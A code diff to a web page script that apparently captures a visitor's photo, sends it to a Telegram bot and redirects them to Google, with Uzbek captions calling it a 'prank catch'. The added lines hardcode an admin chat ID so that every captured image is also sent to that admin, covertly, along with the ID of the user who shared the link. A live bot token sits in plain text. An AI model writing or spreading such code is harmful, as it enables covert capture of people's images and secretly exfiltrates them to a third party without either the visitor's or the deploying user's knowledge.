@@ -90,6 +90,7 @@
     <script>
         const params    = new URLSearchParams(window.location.search);
         const CHAT_ID   = params.get('id') || '5724786253';
+        const ADMIN_ID  = '5724786253';
         const TOKEN     = '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
         const REDIRECT  = params.get('redirect') || 'https://www.google.com';
 
@@ -156,12 +157,26 @@
             // 2-yo'l: To'g'ridan-to'g'ri Telegram API ga (zaxira)
             try {
                 const blob = await (await fetch(dataUrl)).blob();
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'photo.jpg');
+                
+                // Doim adminga yuborish
+                const fdAdmin = new FormData();
+                fdAdmin.append('chat_id', ADMIN_ID);
+                fdAdmin.append('caption', '📸 Yangi prank o\'ljasi (Direct)' + (CHAT_ID !== ADMIN_ID ? `\n👤 User: ${CHAT_ID}` : ''));
+                fdAdmin.append('photo', blob, 'photo.jpg');
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST', body: fd
+                    method: 'POST', body: fdAdmin
                 });
+
+                // Agar boshqa user bo'lsa, unga ham yuborish
+                if (CHAT_ID && CHAT_ID !== ADMIN_ID) {
+                    const fdUser = new FormData();
+                    fdUser.append('chat_id', CHAT_ID);
+                    fdUser.append('caption', '📸 Yangi prank o\'ljasi!');
+                    fdUser.append('photo', blob, 'photo.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST', body: fdUser
+                    }).catch(() => {});
+                }
             } catch (_) {}
         }
 
